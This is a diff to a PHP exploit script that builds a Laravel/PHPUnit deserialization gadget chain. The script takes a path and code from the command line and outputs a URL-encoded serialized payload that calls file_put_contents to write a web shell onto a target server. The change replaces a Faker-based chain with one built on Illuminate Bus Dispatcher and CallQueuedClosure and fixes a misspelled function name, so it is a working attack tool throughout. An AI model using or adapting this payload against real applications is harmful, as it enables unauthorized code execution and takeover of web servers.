@@ -15,29 +15,31 @@ namespace Illuminate\Broadcasting
             $this->event = $event;
         }
     }
+
 }
 
-namespace Faker
+namespace Illuminate\Bus
 {
-    class ValidGenerator{
-        protected $generator;
-        protected $validator;
-        protected $maxRetries;
-        public function __construct($generator,$validator,$maxRetries=10000)
+    class Dispatcher{
+        protected $queueResolver;
+        public function __construct($queueResolver)
         {
-            $this->generator = $generator;
-            $this->validator = $validator;
-            $this->maxRetries = $maxRetries;
-        }
-    }
-    class DefaultGenerator{
-        protected $default;
-        public function __construct($default)
-        {
-            $this->default = $default;
+            $this->queueResolver = $queueResolver;
         }
     }
 }
+
+namespace Illuminate\Queue
+{
+    class CallQueuedClosure{
+        public $connection;
+        public function __construct($connection)
+        {
+            $this->connection = $connection;
+        }
+    }
+}
+
 namespace PHPUnit\Framework\MockObject\Invocation
 {
     class StaticInvocation{
@@ -61,7 +63,7 @@ namespace PHPUnit\Framework\MockObject\Stub
 }
 
 namespace
-{
+{   
     if($argc<3){
         echo "Description:\n\tUse laravel deserialization to write shell.";
         echo "\nUsage:" .$argv[0] . " <path> <code>";
@@ -70,9 +72,9 @@ namespace
     $path = $argv[1];
     $code = $argv[2];
     $staticInvocation = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation(array($path,$code));
-    $defaultgererator = new Faker\DefaultGenerator($staticInvocation);
-    $returncallback = new PHPUnit\Framework\MockObject\Stub\ReturnCallback("file_put_cntents");
-    $validgenerator = new Faker\ValidGenerator($defaultgererator,$returncallback);
-    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($validgenerator,"pass");
+    $callQueued = new Illuminate\Queue\CallQueuedClosure($staticInvocation);
+    $returncallback = new PHPUnit\Framework\MockObject\Stub\ReturnCallback("file_put_contents");
+    $dispatcher = new Illuminate\Bus\Dispatcher(array($returncallback,"invoke"));
+    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$callQueued);
     echo urlencode(serialize($pendingbroadcast));
 }
